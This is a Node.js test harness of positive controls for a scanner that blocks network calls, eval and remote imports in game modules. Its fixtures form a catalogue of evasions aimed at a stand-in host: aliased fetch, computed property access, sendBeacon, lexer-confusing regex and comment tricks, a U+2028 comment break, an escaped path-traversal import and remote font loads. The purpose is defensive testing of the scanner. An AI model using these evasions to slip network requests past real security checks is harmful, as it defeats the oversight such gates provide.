#!/usr/bin/env node
/**
 * CHECK 12 — the positive controls for check 11.
 *
 * The property under test is NOT "check 11 passes". It is **"check 11 fails when it
 * should, on each construct individually, and passes when it should"**. A check nobody
 * has watched go red is indistinguishable from one that cannot.
 *
 * EVERY CASE THE ADVERSARIAL PASS FOUND IS NOW A CONTROL. The pass defeated the first
 * version of check 11 comprehensively — a relative import into an unscanned
 * subdirectory, a `.mjs` sibling, a second template substitution, two static-import
 * evasions, `new Image().src`, and `const f = fetch` with no parenthesis anywhere. Each
 * is pinned here, so the fix cannot silently rot. **When these controls broke after
 * check 11 was rewritten, that was them working**: they are anchored to what check 11
 * SAYS, not merely to whether it exits non-zero.
 *
 * Each case runs against a THROWAWAY `games/` in a temp dir, never the repository's
 * own, and invokes check 11 as a subprocess exactly as CI does — so what is tested is
 * the shipped file, not a copy of its logic.
 */
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const CHECK = join(HERE, 'check-games-offline.mjs');
/* FAILS CLOSED. This used to initialise to 'unknown' and pass — architecture §5 says
 * every demonstration asserts the commit it ran against, and a green with no
 * identifiable subject is a claim about a tree nobody can name. PUP-WO-0300 fixed it in
 * one check and recorded the rest; PUP-WO-0201 is the next work order to open this
 * directory, which is where CC-A ruled the sweep belongs. PUPPAD_SUBJECT lets a tree
 * with no .git — a `git archive` export, which the freeze protocol hands a read-only
 * adversarial pass — state its own subject instead. */
let COMMIT = process.env.PUPPAD_SUBJECT || '';
if (!COMMIT) {
  try { COMMIT = execFileSync('git', ['-C', join(HERE, '..', '..'), 'rev-parse', 'HEAD'], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim(); } catch {}
}
if (!/^[0-9a-f]{7,40}$/.test(COMMIT)) {
  console.error('::error::CHECK 12 cannot identify the commit it is testing.');
  console.error('  Run it inside the repository, or set PUPPAD_SUBJECT=<sha>.');
  process.exit(1);
}

const results = [];
/* `noteText`/`noNoteText` are checked WHATEVER the colour. Check 11's notes are a
 * deliberate middle ground — a construct it cannot judge from text becomes a visible
 * note rather than a build break — and a note is only worth having if it fires when it
 * should AND stays quiet when it should not. One of them fired on every green run of
 * this repo's own game module, which is a note carrying no information. */
function run(label, { files, expect, expectText, noteText, noNoteText }) {
  const dir = mkdtempSync(join(tmpdir(), 'puppad-games-'));
  try {
    if (files !== null) {
      for (const [name, src] of Object.entries(files)) {
        const full = join(dir, 'games', name);
        mkdirSync(dirname(full), { recursive: true });
        writeFileSync(full, src);
      }
      mkdirSync(join(dir, 'games'), { recursive: true });
    }
    let out = '', code = 0;
    try {
      /* PUPPAD_SUBJECT because check 11 now FAILS CLOSED on a tree whose commit it
       * cannot name, and every fixture here is a throwaway directory with no .git. That
       * is the sweep's cost, paid where it belongs: a control harness knows what it is
       * testing and can say so, which is exactly the case the escape hatch is for. */
      out = execFileSync(process.execPath, ['--experimental-vm-modules', CHECK, dir],
        { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'],
          env: { ...process.env, PUPPAD_SUBJECT: COMMIT } });
    } catch (e) { code = e.status ?? 1; out = (e.stdout || '') + (e.stderr || ''); }
    const observed = code === 0 ? 'GREEN' : 'RED';
    /* THE EXIT CODE IS NOT THE VERDICT (PUP-WO-0103 finding B). A RED for the wrong
     * reason is not evidence that the construct under test is detected — a fixture with
     * a typo would be red too and would score as proof. A RED case must NAME what it
     * was built to catch. */
    const matched = observed !== 'RED' || !expectText || out.includes(expectText);
    const noteOk = (!noteText || out.includes(noteText)) && (!noNoteText || !out.includes(noNoteText));
    const pass = observed === expect && matched && noteOk;
    if (observed === expect && matched && !noteOk) {
      console.log(`        the COLOUR was right but the NOTES were not: wanted ${JSON.stringify(noteText || '')}, refused ${JSON.stringify(noNoteText || '')}`);
    }
    if (observed === expect && !matched) console.log(`        RED, but NOT on the expected construct: wanted ${JSON.stringify(expectText)}`);
    results.push({ label, expect, observed, pass });
    console.log(`${pass ? '  ok  ' : '  MISPREDICTED'} ${observed.padEnd(5)} ${label}`);
  } finally { rmSync(dir, { recursive: true, force: true }); }
}

const wrap = (body) => `export default function mount(host, api) {\n  ${body}\n  return function teardown() {};\n}\n`;
const CLEAN = wrap("host.textContent = 'hello';");

console.log(`CHECK 12 — check 11's positive controls. subject ${COMMIT.slice(0, 12)}\n`);

console.log('=== PART A — fail closed. Scanning nothing is a FAILURE, never a pass ===');
run('no games/ directory at all', { files: null, expect: 'RED', expectText: 'cannot be read' });
run('games/ exists but holds no modules', { files: {}, expect: 'RED', expectText: 'no modules' });
run('a module that does not parse', { files: { 'x.js': 'export default function f({ \n' }, expect: 'RED', expectText: 'does not parse' });

console.log('\n=== PART B — each forbidden construct, ALONE, must go RED and be NAMED ===');
const SOLO = [
  ['fetch(url)',            "fetch('https://e/x');",                  'fetch'],
  ['const f = fetch  (NO PAREN — the pass proved `fetch(` was not enough)',
                            "const f = fetch; f('https://e/x');",     'fetch'],
  ['XMLHttpRequest',        'const x = new XMLHttpRequest();',        'XMLHttpRequest'],
  ['EventSource',           "const e = new EventSource('/s');",       'EventSource'],
  ['WebSocket',             "const w = new WebSocket('wss://x');",    'WebSocket'],
  ['const S = WebSocket (aliased)', 'const S = WebSocket; new S("wss://x");', 'WebSocket'],
  ['eval(',                 "eval('1+1');",                           'eval('],
  ['new Function(',         "const f = new Function('return 1');",    'new Function('],
  ['importScripts(',        "importScripts('x.js');",                 'importScripts('],
  ['navigator.sendBeacon',  "navigator.sendBeacon('/b','d');",        'sendBeacon'],
  ['Reflect.get(',          "Reflect.get(globalThis,'x');",           'Reflect.get('],
  ['window[',               "window['fet'+'ch']('/x');",              'window['],
  ['globalThis[',           "globalThis['x']();",                     'globalThis['],
  ['self[',                 "self['x']();",                           'self['],
  ['navigator[',            "navigator['send'+'Beacon']('/b','d');",  'navigator['],
  ['document.defaultView',  "document.defaultView.x();",              'document.defaultView'],
  ['new Worker(',           "new Worker(URL.createObjectURL(new Blob([''])));", 'new Worker('],
  ['new Image().src = remote  (ordinary DOM, not a clever bypass)',
                            "const i = new Image(); i.src = 'https://e/p.png';", '.src = <remote>'],
  ['el.href = remote',      "const l = document.createElement('link'); l.href = 'https://e/x.css';", '.href = <remote>'],
  ['form.action = remote',  "const f2 = document.createElement('form'); f2.action = 'https://e/c';", '.action = <remote>'],
  ['location.assign(',      "location.assign('https://e/nav');",      'location.assign('],
  /* THE THREE THE ADVERSARIAL PASS DEMONSTRATED FETCHING OFF-ORIGIN THROUGH A GREEN
   * MODULE. PUP-WO-0300 §3 says this check "will red on" a remote font; it did not, by
   * either form, and neither on a CSS background. A ground-truth document claiming
   * coverage that does not exist is the defect this project has a standing rule about,
   * and the cheaper end of the fix is to make the claim true. */
  ['@font-face with a remote src in a <style>',
                            "const st = document.createElement('style'); st.textContent = '@font-face{font-family:g;src:url(https://e/f.woff2)}'; host.appendChild(st);", 'url(<remote>)'],
  ['new FontFace(name, url(remote))',
                            "new FontFace('g', 'url(https://e/f.woff2)').load();", 'url(<remote>)'],
  ['style.backgroundImage = url(remote)',
                            "host.style.backgroundImage = \"url('https://e/bg.png')\";", 'url(<remote>)'],
];
for (const [name, body, text] of SOLO) run(`${name} alone`, { files: { 'x.js': wrap(body) }, expect: 'RED', expectText: text });

console.log('\n=== PART B2 — the graph. What the pass got through, pinned ===');
run('a relative import into a subdirectory that fetches', {
  files: { 'x.js': "import leak from './sub/evil.js';\n" + wrap('leak();'),
           'sub/evil.js': "export default function leak(){ const f = fetch; f('https://e/x'); }\n" },
  expect: 'RED', expectText: 'fetch',
});
run('a .mjs sibling that fetches (the glob used to be .js only)', {
  files: { 'x.js': CLEAN, 'evil.mjs': "export function leak(){ fetch('https://e/x'); }\n" },
  expect: 'RED', expectText: 'fetch',
});
run('a relative import that ESCAPES games/', {
  files: { 'x.js': "import z from '../outside.js';\n" + CLEAN },
  expect: 'RED', expectText: 'OUTSIDE games/',
});
run('the SECOND substitution of a template literal is code', {
  files: { 'x.js': wrap('host.innerHTML = `<b>${1}</b><i>${(()=>{ const f = fetch; f("https://e/x"); return "t"; })()}</i>`;') },
  expect: 'RED', expectText: 'fetch',
});
run("import{x}from'remote' — no whitespace", {
  files: { 'x.js': "import{helper}from'https://e/m.js';\n" + CLEAN },
  expect: 'RED', expectText: 'not a relative path',
});
run('a static import specifier on the NEXT line', {
  files: { 'x.js': "import helper from\n  'https://e/m.js';\n" + CLEAN },
  expect: 'RED', expectText: 'not a relative path',
});
run('a NON-LITERAL dynamic import cannot be judged, so it is refused', {
  files: { 'x.js': wrap("const p = './x' + api.entry.id + '.js'; import(p);") },
  expect: 'RED', expectText: 'non-literal',
});
/* A BARE SPECIFIER. PUP-WO-0113 acceptance 3 names four evasions the pattern must still
 * catch after the repair, and this was the one with no control of its own — the remote
 * URL, the no-whitespace form and the next-line specifier each had one, and "bare" was
 * covered only incidentally by them sharing a message. A repair inherits none of the old
 * assertion's credibility, so each is planted separately now. */
run('a BARE specifier — no scheme, no dot, resolved by an import map that games/ has not got', {
  files: { 'x.js': "import z from 'lodash-es';\n" + CLEAN },
  expect: 'RED', expectText: 'not a relative path',
});
run('a bare specifier reached DYNAMICALLY', {
  files: { 'x.js': wrap("import('some-package');") },
  expect: 'RED', expectText: 'not a relative path',
});

console.log('\n=== PART C — the removal ladder. Removing ONE retires ONLY its finding ===');
const FOUR = [
  ["fetch('https://e/x');",                'fetch'],
  ['const x = new XMLHttpRequest();',      'XMLHttpRequest'],
  ["const e = new EventSource('/s');",     'EventSource'],
  ["const w = new WebSocket('wss://x');",  'WebSocket'],
];
for (let skip = 0; skip < FOUR.length; skip++) {
  const body = FOUR.filter((_, i) => i !== skip).map(([b]) => b).join('\n  ');
  const dir = mkdtempSync(join(tmpdir(), 'puppad-games-'));
  mkdirSync(join(dir, 'games'), { recursive: true });
  writeFileSync(join(dir, 'games', 'x.js'), wrap(body));
  let out = '';
  try { out = execFileSync(process.execPath, ['--experimental-vm-modules', CHECK, dir], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, PUPPAD_SUBJECT: COMMIT } }); }
  catch (e) { out = (e.stdout || '') + (e.stderr || ''); }
  rmSync(dir, { recursive: true, force: true });
  const gone = !out.includes(`— ${FOUR[skip][1]}`);
  const remaining = (out.match(/ {2}FAIL {2}games\//g) || []).length;
  const pass = gone && remaining === FOUR.length - 1;
  results.push({ label: `removing ${FOUR[skip][1]}`, expect: 'ladder', observed: pass ? 'ladder' : 'broken', pass });
  console.log(`${pass ? '  ok  ' : '  MISPREDICTED'} removed ${FOUR[skip][1].padEnd(16)} its finding GONE=${gone}, others still reported=${remaining}`);
}

console.log('\n=== PART D — what must stay GREEN. A check that cannot pass is not a check ===');
console.log('    (and a check that refuses legitimate game code has a real cost)');
run('a clean module', { files: { 'x.js': CLEAN }, expect: 'GREEN' });
run('a forbidden token inside a COMMENT or STRING only', {
  files: { 'x.js': '// not calling fetch here\n' + wrap('const s = "do not use fetch please"; host.textContent = s;') },
  expect: 'GREEN',
});
run('a RELATIVE static import', { files: { 'x.js': "import z from './helper.js';\n" + CLEAN, 'helper.js': 'export default 1;\n' }, expect: 'GREEN' });
run('LOCAL code-splitting: import("./levels/l2.js")', {
  files: { 'x.js': wrap("import('./levels/l2.js');"), 'levels/l2.js': 'export default 1;\n' },
  expect: 'GREEN',
});
run('a LOCAL image: img.src = "./ball.png"', {
  files: { 'x.js': wrap("const i = new Image(); i.src = './ball.png'; host.appendChild(i);") },
  expect: 'GREEN',
});
run('retrieval( and itself[ — a dog game, not eval( and self[', {
  files: { 'x.js': wrap('function retrieval(n){ return n; } retrieval(0); const itself = [host]; itself[0];') },
  expect: 'GREEN',
});
run('a LOCAL url( in CSS: backgroundImage = url("./bg.png")', {
  files: { 'x.js': wrap('host.style.backgroundImage = "url(\'./bg.png\')";') },
  expect: 'GREEN',
});

console.log('\n=== PART D2 — PROSE IS NOT CODE. PUP-WO-0113: check 11 fired on English ===');
console.log('    (it BLOCKED PUP-WO-0704, reporting an import in a file with no import in it)');

/* THE EXACT REPRODUCTION, REDUCED TO ITS THREE PIECES AND KEPT AS ONE FIXTURE.
 *
 * On PUP-WO-0704's head, check 11 reported `games/blockpop.js:12 — import '.bp-flash'`
 * in a module whose only module-level construct is `export default function mount`. The
 * unbounded `[\s\S]*?` gap — which is unbounded DELIBERATELY, so that `import{x}` and a
 * specifier on the next line are both seen — stitched the finding out of three pieces of
 * English hundreds of lines apart:
 *
 *     `import`  the word "imports" in a comment
 *     `from`    the word "from" in a DIFFERENT comment, much later
 *     '…'       a markdown-style backtick pair around a CSS class name
 *
 * The gap is not the defect and is not touched. The defect was that the scan ran on the
 * RAW source. This fixture keeps the three pieces far apart and in separate comments, so
 * it fails the moment anything makes the scan read prose again. */
run('THE PUP-WO-0704 REPRODUCTION: three pieces of English, in three comments, no code', {
  files: { 'x.js':
    '/* The shell imports with a bare specifier and no cache-buster, so the module\n'
    + ' * object is evaluated once and shared. */\n'
    + CLEAN
    + '\n/* padding so the pieces are nowhere near each other. */\n'.repeat(40)
    + '/* THE GRADIENT IS INVERTED from `.bp-flash`\'s — transparent at the centre. */\n' },
  expect: 'GREEN',
});
run('a whole import STATEMENT written out inside a block comment', {
  files: { 'x.js': "/* the old version did: import evil from 'https://e/m.js'; */\n" + CLEAN },
  expect: 'GREEN',
});
run('a whole import STATEMENT written out inside a line comment', {
  files: { 'x.js': "// import evil from 'https://e/m.js';\n" + CLEAN },
  expect: 'GREEN',
});
run('an import statement inside a STRING LITERAL, not a comment', {
  files: { 'x.js': wrap('host.textContent = "import evil from \'https://e/m.js\'";') },
  expect: 'GREEN',
});

/* AND THE OTHER DIRECTION, WHICH IS THE ONE THAT MATTERS. Making prose invisible is
 * worthless if it also makes CODE invisible: a stripper that is too eager turns a
 * fail-closed gate into a green one, which is strictly worse than the false red it was
 * fixed for. Every one of these is a REAL import that must still be caught, standing
 * next to prose built to look exactly like it. */
run('a REAL remote import on the SAME LINE as a comment that also looks like one', {
  files: { 'x.js': "import z from 'https://e/m.js'; // import z from './safe.js'\n" + CLEAN },
  expect: 'RED', expectText: 'not a relative path',
});
run('a real remote import AFTER a block comment containing a fake one', {
  files: { 'x.js': "/* import z from './safe.js' */ import z from 'https://e/m.js';\n" + CLEAN },
  expect: 'RED', expectText: 'not a relative path',
});
/* THE APOSTROPHE MUST BE THE CONFUSABLE DELIMITER, AND IN THE FIRST VERSION IT WAS NOT.
 * That version put the apostrophe inside a DOUBLE-quoted string, which stresses no lexer
 * at all, and parked the import after the whole wrap() body so even end-of-line damage
 * could not reach it. The adversarial pass mutated strip() to the exact confusion the
 * label names — terminate a string on EITHER quote character — and this control stayed
 * GREEN while a DIFFERENT control caught the mutant. A plant that cannot fail on the
 * defect it is named for is not a plant. The apostrophe is the ESCAPED delimiter of its
 * own single-quoted string now, and the import is on the very next line. */
run('a real remote import after a STRING whose escaped apostrophe could close it early', {
  files: { 'x.js': "const s = 'it\\'s fine';\nimport z from 'https://e/m.js';\n" + CLEAN },
  expect: 'RED', expectText: 'not a relative path',
});
run('a real remote import after a REGEX LITERAL containing a quote (the stripper\'s stated blind spot)', {
  files: { 'x.js': "const RE = /['\"]/g;\nimport z from 'https://e/m.js';\n" + CLEAN },
  expect: 'RED', expectText: 'not a relative path',
});
run('a real remote import after a template literal with a substitution and a quote', {
  files: { 'x.js': "const t = `a${1}b'c`;\nimport z from 'https://e/m.js';\n" + CLEAN },
  expect: 'RED', expectText: 'not a relative path',
});

/* THE REPORTED LINE, WHICH IS THE OTHER HALF OF §4's RULING. Position fidelity is why the
 * scan reads raw at all, so a stripper that preserved everything except the line number
 * would satisfy the letter of the fix and destroy what it was for: a diagnostic that says
 * "somewhere in this file" costs the next reader an hour.
 *
 * AND IT WAS OFF BY ONE BEFORE THE REPAIR, for every import that starts a line —
 * `(?:^|[;}\s])` consumes the NEWLINE ending the previous line, so the match began there.
 * The keyword is captured and reported from now. */
run('the reported LINE is the import keyword\'s own line, not the newline before it', {
  files: { 'x.js': '// line 1\n// line 2\n// line 3\nimport z from \'https://e/m.js\';\n' + CLEAN },
  expect: 'RED', expectText: 'x.js:4 —',
});
run('and it is still right when the specifier is on the NEXT line', {
  files: { 'x.js': '// line 1\n// line 2\nimport z from\n  \'https://e/m.js\';\n' + CLEAN },
  expect: 'RED', expectText: 'x.js:3 —',
});

console.log('\n=== PART D3 — THE STRIPPER IS NOW LOAD-BEARING FOR IMPORTS. Four false GREENS ===');
console.log('    (moving the import scan onto the stripped source made every strip() blind');
console.log('     spot a way for a real remote import to pass. A green gate is worse than a');
console.log('     false red, so each of these was RED before, GREEN after, and is RED again.)');

/* Each fixture is a genuine `import z from 'https://…'` — the construct this gate exists
 * for — preceded by ONE character sequence that used to make `strip()` lose its place and
 * blank the rest of the file. A blanked file scans clean, so each of these passed.
 * Verified individually: RED on the pre-PUP-WO-0113 scanner, GREEN on the first version
 * of the repair, RED again now. The adversarial pass found three; the fourth is the same
 * family and was found by testing its neighbours. */
const REMOTE = "import z from 'https://e/m.js';\n" + CLEAN;
run('a BACKTICK inside a regex literal used to open a template and blank to EOF', {
  files: { 'x.js': 'const RE = /`/;\n' + REMOTE },
  expect: 'RED', expectText: 'not a relative path',
});
run('a SLASH-STAR inside a character class used to open a block comment and blank to EOF', {
  files: { 'x.js': 'const RE = /[/*]/;\n' + REMOTE },
  expect: 'RED', expectText: 'not a relative path',
});
run('a QUOTE inside a regex literal used to open a string and blank the rest of the line', {
  files: { 'x.js': "const RE = /'/g; " + REMOTE },
  expect: 'RED', expectText: 'not a relative path',
});
/* U+2028 IS A LINE TERMINATOR IN JAVASCRIPT AND THE SCANNER ONLY STOPPED AT \n. The
 * engine ends the comment there and executes the import; the scanner ran the comment on
 * to the next real newline and blanked it. The character is in this fixture on purpose —
 * ` ` here is a JS escape, so the file on disk holds the real one. */
run('U+2028 ends a // comment for the ENGINE, and used not to for the scanner', {
  files: { 'x.js': '// a comment ' + REMOTE },
  expect: 'RED', expectText: 'not a relative path',
});

console.log('\n=== PART D4 — a regex literal is CODE whose contents are not ===');
run('a forbidden token inside a REGEX LITERAL is not a call', {
  files: { 'x.js': wrap("const RE = /fetch\\(|eval\\(/; host.textContent = RE.test('x') ? 'y' : 'n';") },
  expect: 'GREEN',
});
run('an import STATEMENT spelled out inside a regex literal is not an import', {
  files: { 'x.js': "const RE = / import.*from '/;\nconst s = 'hi';\n" + CLEAN },
  expect: 'GREEN',
});
run('but a REAL forbidden token AFTER a regex literal on the SAME LINE is still caught', {
  files: { 'x.js': wrap("const RE = /ab+c/g; fetch('https://e/x'); host.textContent = String(RE);") },
  expect: 'RED', expectText: 'fetch',
});
run('DIVISION is not a regex: code after two divisions is still scanned', {
  files: { 'x.js': wrap("const r = (a, b) => a / 2 + b / 3; fetch('https://e/x'); host.textContent = String(r(1,2));") },
  expect: 'RED', expectText: 'fetch',
});

console.log('\n=== PART D5 — when the scanner loses its place it must REFUSE A VERDICT ===');
console.log('    (a blanked file scans clean; reporting that green is the worst outcome here)');
/* THE HEURISTIC CANNOT BE RIGHT ABOUT EVERY `/`, so the question is what happens when it
 * is wrong. `strip()` reports `.broke` when a string, template, block comment or regex
 * literal ran to end of file without closing — and check 11 has ALREADY proved the module
 * parses as an ES module before it strips, so in a file that parses none of those is
 * possible. An unterminated anything therefore means this scanner mis-lexed, and the
 * honest answer is to refuse a verdict on that module rather than report the green a
 * blanked file always gives. That is the replacement for the retired "read it by eye"
 * note: a gate instead of a request. */
/* A FILE THAT PARSES AND THAT THIS SCANNER CANNOT LEX — which is the only shape worth
 * testing, because `scanModule` proves the module parses BEFORE it strips, so an
 * unterminated construct in a file that does NOT parse is caught two branches earlier and
 * proves nothing about `broke`. My first two attempts here were exactly that mistake and
 * went RED for the wrong reason.
 *
 * `const x = {} / 2;` is valid JavaScript dividing an object literal, and `}` is in the
 * set after which a `/` may begin a regex — so the heuristic opens a regex literal that
 * never closes. THE HEURISTIC IS WRONG HERE AND THAT IS THE POINT: it cannot be right
 * about every `/` without a parser, so what matters is what happens when it is wrong.
 * It notices, and refuses a verdict on the module rather than reporting the green that a
 * file blanked to EOF always produces. */
run('a file this scanner cannot lex is a REFUSAL, not a pass', {
  files: { 'x.js': 'const x = {} / 2;\nconst y = String(x);\n' + CLEAN },
  expect: 'RED', expectText: 'lost its place',
});

console.log('\n=== PART D6 — a specifier this scanner cannot decode is not one it may clear ===');
/* `im.spec` is the RAW source text between the quotes, escapes UNDECODED. This one begins
 * "./", passes isRelative, and resolve() treats every character of the escape as an
 * ordinary filename character — so the target stays inside games/ and the module was
 * CLEARED. It decodes to ./a/../../evil.js. Refusing is what this check already does with
 * a non-literal dynamic specifier, and for the same reason: it cannot be judged from text.
 * Decoding it here would mean writing a second JavaScript string parser and trusting it. */
run('a relative-looking specifier that ESCAPES games/ via \\u002f must not be cleared', {
  files: { 'x.js': 'import z from "./a\\u002f..\\u002f..\\u002fevil.js";\n' + CLEAN },
  expect: 'RED', expectText: 'contains an escape',
});

console.log('\n=== PART E — the NOTES: they must fire when they should, and be quiet when they should not ===');
console.log('    (a note lit on every green run carries no information, and the regex-literal');
console.log('     note was lit on this repo\'s own game module, which contains no regex at all)');
run('.src built by CONCATENATION must produce the non-literal note', {
  files: { 'x.js': wrap("const i = new Image(); i.src = 'https:' + '//e/p.png'; host.appendChild(i);") },
  expect: 'GREEN',
  noteText: '<concatenation>',
});
run('ORDINARY DIVISION must NOT produce a regex-literal note', {
  files: { 'x.js': wrap('const cost = (n, a, b) => n * (1 + a / 100 + b / 100); host.textContent = String(cost(2, 50, 50));') },
  expect: 'GREEN',
  noNoteText: 'REGEX LITERAL',
});
/* THE REGEX-LITERAL NOTE IS GONE AND ITS ABSENCE IS ASSERTED. It told a reader to check
 * the module by eye because the scanner did not track regex literals. It does now, so
 * that sentence became false — and a note warning about a hazard that has been closed
 * trains people to ignore notes. What replaced it is the fail-closed refusal in PART D5,
 * which is a gate rather than a request. If anyone puts the note back, this goes red. */
run('a REAL regex literal must NOT produce the retired "read it by eye" note', {
  files: { 'x.js': wrap("const RE = /ab+c/g; host.textContent = RE.test('abc') ? 'y' : 'n';") },
  expect: 'GREEN',
  noNoteText: 'REGEX LITERAL',
});
/* THE SURVIVES-COMMENTS-BUT-NOT-STRIPPING NOTE, ALL FOUR DIRECTIONS — and the first
 * version of it was baselined on the RAW source, which lit it on any module whose PROSE
 * mentions an import. games/blockpop.js would have carried it on every green run forever,
 * which is precisely the "a note lit on every green run carries no information" failure
 * this file rewrote the regex note for. Baselined on `noComments` now: a mention in a
 * comment is silent, and a construct that survives comment-removal and then vanishes did
 * not vanish because it was prose. */
run('an import mentioned only in a COMMENT must NOT produce it — that is ordinary prose', {
  files: { 'x.js': "// import evil from 'https://e/m.js';\n" + CLEAN },
  expect: 'GREEN',
  noNoteText: 'vanish from the stripped source',
});
run('nor may the real prose from the module that started PUP-WO-0113', {
  files: { 'x.js': '/* the shell imports with a bare specifier and no cache-buster. */\n'
    + CLEAN + "\n/* THE GRADIENT IS INVERTED from `.bp-flash`'s. */\n" },
  expect: 'GREEN',
  noNoteText: 'vanish from the stripped source',
});
/* The word must be preceded by `;}` or whitespace for the pattern to see it at all — in
 * the first version of this fixture the `import` sat immediately after the opening double
 * quote, so nothing matched and the note stayed silent for a reason that had nothing to
 * do with what the control was testing. */
run('an import inside a STRING does produce it — that is the population worth reading', {
  files: { 'x.js': wrap('host.textContent = "we used to import evil from \'https://e/m.js\'";') },
  expect: 'GREEN',
  noteText: 'vanish from the stripped source',
});
run('and a module with no import-shaped text at all is silent', {
  files: { 'x.js': CLEAN },
  expect: 'GREEN',
  noNoteText: 'vanish from the stripped source',
});

console.log('\n' + '='.repeat(78));
const bad = results.filter((r) => !r.pass);
if (bad.length) {
  console.error(`::error::CHECK 12 FAILED — ${bad.length} control(s) did not behave as predicted.`);
  console.error(`\nCHECK 12 FAILED at ${COMMIT.slice(0, 12)} — ${bad.length} control(s):`);
  for (const r of bad) console.error(`  ${r.label}: expected ${r.expect}, got ${r.observed}`);
  console.error('\n  A control that stops working means check 11 is no longer known to be able');
  console.error('  to go red on that construct. Do NOT delete the control to make this green.');
  process.exit(1);
}
console.log(`CHECK 12 PASSED at ${COMMIT.slice(0, 12)} — ${results.length} controls, all as predicted.`);
/* NO PER-PART COUNTS IN THIS SUMMARY. Three of them went stale the moment PART E was
 * added, which is the same defect as a CI job named for a number of checks it no longer
 * runs. The one number here is `results.length`, and the run computes it. */
console.log('  PART A  fail-closed conditions; scanning nothing is a FAILURE.');
console.log('  PART B  each forbidden construct ALONE and NAMED — detect EACH, not ANY,');
console.log('          including the remote font and the CSS url() that PUP-WO-0300 §3');
console.log('          claimed this check covered and it did not.');
console.log('  PART B2 the cases the adversarial pass got through the first version:');
console.log('          an unscanned subdirectory, a .mjs sibling, an escaping import, a');
console.log('          second template substitution, two static-import evasions, and a');
console.log('          non-literal dynamic specifier.');
console.log('  PART C  the removal ladder: retiring one construct retires exactly one');
console.log('          finding and leaves the others standing.');
console.log('  PART D  what must stay GREEN, including the cases the pass showed were');
console.log('          wrongly refused: local code-splitting, a local image, a local url().');
console.log('  PART E  the NOTES — they fire when they should and stay quiet when they');
console.log('          should not. One of them was lit on every green run of this repo\'s');
console.log('          own game module, which contains no regex literal at all.');
